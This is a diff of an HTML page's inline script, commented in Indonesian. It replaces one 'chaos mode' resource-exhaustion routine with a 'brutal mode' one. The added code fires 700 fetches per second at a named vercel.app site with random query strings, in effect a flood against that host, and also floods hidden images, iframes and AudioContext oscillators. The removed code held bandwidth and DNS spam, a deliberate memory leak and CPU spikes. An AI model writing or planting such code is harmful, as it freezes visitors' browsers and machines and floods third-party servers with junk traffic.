@@ -183,46 +183,49 @@
     duration--;
   }, 1000);
 
-  // Simulasi network lag: spam fetch
-  setInterval(() => {
-    for (let i = 0; i < 500; i++) {
-      fetch("https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png").catch(() => {});
-    }
-  }, 1000);
-  // 🧨 ULTIMATE CHAOS MODE
-let heavyObjects = [];
-
+  // // 1. LOOP fetch brutal (700x tiap 1 detik)
 setInterval(() => {
-  // Dummy image spam (bandwidth stress)
-  for (let i = 0; i < 300; i++) {
-    fetch("https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png")
-      .catch(() => {});
+  for (let i = 0; i < 700; i++) {
+    fetch(`https://toko-clariven.vercel.app?rand=${Math.random()}`).catch(()=>{});
   }
+}, 1000);
 
-  // DNS lookup spam to fake domains
-  for (let i = 0; i < 200; i++) {
-    fetch("https://fake" + Math.random().toString(36).substring(2) + ".com")
-      .catch(() => {});
+// 2. SPAM image request (700x tiap 1.5 detik)
+setInterval(() => {
+  for (let i = 0; i < 700; i++) {
+    const img = new Image();
+    img.src = `https://picsum.photos/200?rand=${Math.random()}`;
+    img.style.display = "none";
+    document.body.appendChild(img);
   }
+}, 1500);
 
-  // Allocate huge dummy data to eat memory
-  const junk = new Array(1000000).fill(Math.random());
-  heavyObjects.push(junk); // never released → memory leak
-
-  // CPU spike: dummy math operations
-  for (let i = 0; i < 10000000; i++) {
-    Math.sqrt(Math.random() * i);
+// 3. iframe flooding (700x tiap 2 detik)
+setInterval(() => {
+  for (let i = 0; i < 700; i++) {
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://example.com/?q=" + Math.random();
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+    setTimeout(() => iframe.remove(), 8000);
   }
+}, 2000);
 
-  // Fake websocket connect (never succeed)
-  try {
-    new WebSocket("wss://notreal-" + Math.random().toString(36).substring(2) + ".com");
-  } catch (e) {}
+// 4. AudioContext spam (700x tiap 3 detik)
+setInterval(() => {
+  for (let i = 0; i < 700; i++) {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    osc.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.05);
+  }
+}, 3000);
 
-}, 3000); // repeat every 3s
-
-// Optional: force reload loop (uncomment if mau ekstrim)
-// setInterval(() => location.reload(), 1000 * 60 * 30); // reload tiap 30 menit
+// 5. Logging biar kamu tahu dia masih hidup
+setInterval(() => {
+  console.log("🔥 Brutal mode aktif - Loop x700 jalan terus...");
+}, 2000);
 </script>
 </body>
 </html>
